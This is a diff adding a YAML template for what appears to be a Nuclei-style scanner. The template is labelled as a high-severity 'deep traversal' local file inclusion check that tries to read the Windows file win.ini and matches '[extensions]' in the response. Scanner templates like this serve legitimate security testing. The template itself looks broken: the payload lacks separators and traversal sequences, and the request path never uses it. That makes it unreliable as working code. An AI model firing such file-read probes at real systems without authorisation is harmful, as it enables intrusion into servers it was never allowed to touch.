@@ -1,0 +1,20 @@
+id: lfi7-239
+name: 'Deep traversal in dir'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via dir'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      dir:
+        - 'C:Windowswin.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
